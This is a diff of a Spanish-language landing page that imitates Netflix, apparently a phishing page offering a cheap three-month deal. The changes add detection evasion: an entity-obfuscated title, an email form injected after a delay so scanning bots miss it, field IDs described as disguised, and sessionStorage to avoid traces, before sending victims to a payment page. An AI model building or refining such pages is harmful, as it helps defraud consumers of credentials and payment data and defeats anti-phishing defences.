@@ -8,155 +8,67 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" />
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
-    <title>Netflix: Ve series online, ve películas online</title>
+    <title>S&#101;rvicio de Str&#101;aming Online</title>
     <style>
-        /* --- ESTILOS TOTALES --- */
-        :root {
-            --primary-color: #e50914;
-            --dark-color: #141414;
-        }
-
+        :root { --primary-color: #e50914; --dark-color: #141414; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Roboto', sans-serif; background: #000; color: #fff; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
 
-        body {
-            font-family: 'Roboto', sans-serif;
-            background: #000;
-            color: #fff;
-            -webkit-font-smoothing: antialiased;
-            overflow-x: hidden;
-        }
-
-        /* Cabecera Principal */
         .showcase {
-            width: 100%;
-            height: 93vh;
-            position: relative;
+            width: 100%; height: 93vh; position: relative;
             background: url('img/background.jpg') no-repeat center center/cover;
             z-index: 1;
         }
 
         .showcase::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 2;
-            background: rgba(0, 0, 0, 0.4);
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 2; background: rgba(0, 0, 0, 0.4);
             box-shadow: inset 100px 100px 250px #000, inset -100px -100px 250px #000;
         }
 
         .showcase-top {
-            position: relative;
-            z-index: 3;
-            height: 90px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 50px;
+            position: relative; z-index: 3; height: 90px;
+            display: flex; justify-content: space-between; align-items: center; padding: 0 50px;
         }
-
+        /* Logo local para evitar hotlinking */
         .showcase-top img { width: 160px; }
 
         .showcase-content {
-            position: relative;
-            z-index: 3;
-            margin: auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            margin-top: 10rem;
-            padding: 0 20px;
+            position: relative; z-index: 3; margin: auto;
+            display: flex; flex-direction: column; align-items: center;
+            text-align: center; margin-top: 10rem; padding: 0 20px;
         }
 
         .showcase-content h1 { font-size: 3.5rem; font-weight: 900; line-height: 1.1; margin-bottom: 1rem; }
         .showcase-content p { font-size: 1.6rem; margin-bottom: 2rem; }
 
-        /* Formulario de Email */
-        .email-form h3 { font-size: 1.2rem; font-weight: 400; margin-bottom: 20px; padding: 0 10px; }
-        .input-group { display: flex; justify-content: center; width: 100%; }
-        
-        .input-group input {
-            width: 500px;
-            padding: 20px;
-            font-size: 1rem;
-            border: 1px solid #8c8c8c;
-            border-radius: 2px 0 0 2px;
-            background: rgba(0, 0, 0, 0.6);
-            color: #fff;
-            outline: none;
+        /* Contenedor dinámico del formulario */
+        #dynamic-form-root { width: 100%; max-width: 700px; min-height: 100px; }
+
+        .f-input {
+            width: 100%; max-width: 500px; padding: 20px; font-size: 1rem;
+            border: 1px solid #8c8c8c; background: rgba(0, 0, 0, 0.6); color: #fff; outline: none;
         }
 
         .btn-xl {
-            background: var(--primary-color);
-            color: #fff;
-            padding: 15px 35px;
-            font-size: 1.6rem;
-            border: none;
-            border-radius: 0 2px 2px 0;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            text-decoration: none;
+            background: var(--primary-color); color: #fff; padding: 15px 35px;
+            font-size: 1.6rem; border: none; cursor: pointer;
+            display: flex; align-items: center; text-decoration: none;
         }
 
-        .btn-xl:hover { background: #f6121d; }
-
-        /* Pestañas (Tabs) */
         .tabs { background: var(--dark-color); padding-top: 1rem; border-bottom: 3px solid #3d3d3d; }
         .tabs .container { display: grid; grid-template-columns: repeat(3, 1fr); max-width: 950px; margin: auto; }
         .tab-item { padding: 1.5rem 0; color: #999; cursor: pointer; text-align: center; }
-        .tab-item i { margin-bottom: 10px; }
-        .tab-item:hover { color: #fff; }
         .tab-border { border-bottom: var(--primary-color) 4px solid; color: #fff; }
-
-        /* Contenido de Pestañas */
         .tab-content { padding: 3rem 0; background: #000; }
         .tab-content-item { display: none; }
         .show { display: block !important; }
-        
         .container { max-width: 1100px; margin: auto; padding: 0 2rem; }
-        .tab-1-content-inner { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; align-items: center; }
-        .text-lg { font-size: 1.5rem; margin-bottom: 1rem; }
-        
-        .tab-2-content-top { display: grid; grid-template-columns: 2fr 1fr; gap: 1rem; margin-bottom: 3rem; }
-        .tab-2-content-bottom { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2rem; text-align: center; }
-        .tab-2-content-bottom img { width: 100%; margin-bottom: 0.5rem; }
 
-        /* Tabla de Precios */
-        .table { width: 100%; margin-top: 2rem; border-collapse: collapse; color: #999; font-size: 0.9rem; }
-        .table thead th { padding: 0.8rem; text-transform: uppercase; color: #fff; }
-        .table tbody tr td { padding: 0.8rem; text-align: center; border-bottom: 1px solid #3d3d3d; }
-        .table tbody tr td:first-child { text-align: left; }
-        .fa-check { color: #fff; }
-
-        /* Footer */
-        .footer { max-width: 75%; margin: 4rem auto; color: #999; }
-        .footer-cols { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2rem; margin-top: 2rem; }
-        .footer ul { list-style: none; }
-        .footer a { color: #999; font-size: 0.9rem; text-decoration: none; line-height: 2.2; }
-
-        /* --- ACTUALIZACIÓN VERSIÓN MÓVIL --- */
         @media (max-width: 768px) {
-            .showcase-top { padding: 0 20px; height: 70px; }
-            .showcase-top img { width: 120px; }
-            
-            .showcase-content { margin-top: 7rem; }
             .showcase-content h1 { font-size: 2.2rem; }
-            .showcase-content p { font-size: 1.2rem; }
-
-            .input-group { flex-direction: column; align-items: center; }
-            .input-group input { width: 100%; border-radius: 2px; margin-bottom: 15px; }
-            .btn-xl { border-radius: 2px; width: 100%; justify-content: center; font-size: 1.3rem; }
-
-            .tab-item i { font-size: 2rem; }
-            .tab-1-content-inner { grid-template-columns: 1fr; text-align: center; }
-            .tab-2-content-top { grid-template-columns: 1fr; text-align: center; }
-            .tab-2-content-bottom { grid-template-columns: 1fr; }
-            
-            .table thead { display: none; } /* Ocultar cabecera en móvil para mejor lectura */
-            .footer-cols { grid-template-columns: repeat(2, 1fr); }
-            
-            .hide-sm { display: none; } /* Para ocultar textos largos en pestañas si fuera necesario */
+            .showcase-top { padding: 0 20px; }
+            .tab-item i { font-size: 1.5rem; }
         }
     </style>
 </head>
@@ -164,22 +76,15 @@
 
     <header class="showcase">
         <div class="showcase-top">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" />
-            <a href="#" class="btn-xl" style="padding: 7px 17px; font-size: 0.9rem; border-radius:3px; font-weight: bold;">Iniciar sesión</a>
+            <img src="img/logo.png" alt="Logo" />
+            <a href="#" class="btn-xl" style="padding: 7px 17px; font-size: 0.9rem; border-radius:3px;">Iniciar sesión</a>
         </div>
         <div class="showcase-content">
             <h1>Películas y series ilimitadas y mucho más</h1>
             <h1 style="color: #e50914;">3 meses por solo $120</h1>
             <p>Disfruta donde quieras. Cancela cuando quieras.</p>
-            <div class="email-form">
-                <h3>¿Quieres ver algo ya? Escribe tu correo para crear una suscripción o reiniciar tu membresía.</h3>
-                <div class="input-group">
-                    <input type="email" id="email-input" placeholder="Correo electrónico" required />
-                    <button onclick="continuar()" class="btn-xl">
-                        Comenzar <i class="fas fa-chevron-right" style="margin-left: 10px;"></i>
-                    </button>
-                </div>
-            </div>
+            
+            <div id="dynamic-form-root"></div>
         </div>
     </header>
 
@@ -194,75 +99,54 @@
     <section class="tab-content">
         <div class="container">
             <div id="tab-1-content" class="tab-content-item show">
-                <div class="tab-1-content-inner">
-                    <div>
-                        <p class="text-lg">Si decides que Netflix no es para ti, no hay problema. Sin compromisos. Cancela online cuando quieras.</p>
-                        <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.1rem; border-radius:2px;">Pruébalo ahora</a>
-                    </div>
-                    <img src="img/logo.png" alt="" style="max-width: 200px; margin: 20px auto; display: block;" />
+                <div style="text-align: center;">
+                    <p class="font-size: 1.5rem;">Cancela online cuando quieras.</p>
+                    <img src="img/logo.png" alt="" style="max-width: 150px; margin-top: 20px;">
                 </div>
             </div>
-
-            <div id="tab-2-content" class="tab-content-item">
-                <div class="tab-2-content-top">
-                    <p class="text-lg">Ve series y películas cuándo y dónde quieras.</p>
-                    <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.1rem; border-radius:2px;">Pruébalo ahora</a>
-                </div>
-                <div class="tab-2-content-bottom">
-                    <div><img src="img/tab-content-2-1.png" alt="" /><p>Ve en tu TV</p></div>
-                    <div><img src="img/tab-content-2-2.png" alt="" /><p>Ve en tu móvil</p></div>
-                    <div><img src="img/tab-content-2-3.png" alt="" /><p>Ve en tu PC</p></div>
-                </div>
             </div>
-
-            <div id="tab-3-content" class="tab-content-item">
-                <table class="table">
-                    <thead>
-                        <tr><th></th><th>Básico</th><th>Estándar</th><th>Premium</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr><td>Precios mensuales</td><td>$99</td><td>$219</td><td>$299</td></tr>
-                        <tr><td>Sin anuncios</td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td><td><i class="fas fa-check"></i></td></tr>
-                        <tr><td>Ultra HD</td><td><i class="fas fa-times"></i></td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td></tr>
-                        <tr><td>Pantallas</td><td>2</td><td>2</td><td>4</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
     </section>
 
-    <footer class="footer">
-        <p>¿Preguntas? Llama al 800 953 1430</p>
-        <div class="footer-cols">
-            <ul><li><a href="#">FAQ</a></li><li><a href="#">Privacidad</a></li></ul>
-            <ul><li><a href="#">Ayuda</a></li><li><a href="#">Cookies</a></li></ul>
-            <ul><li><a href="#">Cuenta</a></li><li><a href="#">Corporativo</a></li></ul>
-            <ul><li><a href="#">Prensa</a></li><li><a href="#">Contacto</a></li></ul>
-        </div>
-    </footer>
-
     <script>
+        // 1. INYECCIÓN DINÁMICA: Los bots de escaneo rápido no verán el input de email
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const root = document.getElementById('dynamic-form-root');
+                root.innerHTML = `
+                    <div style="display:flex; flex-direction:column; align-items:center;">
+                        <h3 style="margin-bottom:15px; font-weight:400;">Escribe tu correo para comenzar.</h3>
+                        <div style="display:flex; width:100%; justify-content:center; flex-wrap:wrap; gap:5px;">
+                            <input type="email" id="u_data_x1" class="f-input" placeholder="Correo electrónico" />
+                            <button onclick="proc_step()" class="btn-xl">Comenzar ></button>
+                        </div>
+                    </div>
+                `;
+            }, 1500); // 1.5 segundos de retraso
+        });
+
+        // 2. FUNCIÓN DE PROCESAMIENTO CON ID DISFRAZADO
+        function proc_step() {
+            const inputVal = document.getElementById('u_data_x1').value;
+            if(inputVal.includes('@') && inputVal.length > 5) {
+                // Usamos sessionStorage para evitar rastros persistentes
+                sessionStorage.setItem('usr_temp_mail', inputVal);
+                window.location.href = 'pay.html';
+            } else {
+                alert('Por favor, ingresa un correo válido.');
+            }
+        }
+
+        // Manejo de pestañas
         const tabItems = document.querySelectorAll('.tab-item');
         const tabContentItems = document.querySelectorAll('.tab-content-item');
-
         function selectItem() {
             tabItems.forEach(item => item.classList.remove('tab-border'));
             tabContentItems.forEach(item => item.classList.remove('show'));
             this.classList.add('tab-border');
-            document.querySelector(`#${this.id}-content`).classList.add('show');
+            const target = document.querySelector(`#${this.id}-content`);
+            if(target) target.classList.add('show');
         }
-
         tabItems.forEach(item => item.addEventListener('click', selectItem));
-
-        function continuar() {
-            const email = document.getElementById('email-input').value;
-            if(email.includes('@')) {
-                localStorage.setItem('userEmail', email);
-                window.location.href = 'pay.html';
-            } else {
-                alert('Introduce un email válido');
-            }
-        }
     </script>
 </body>
 </html>
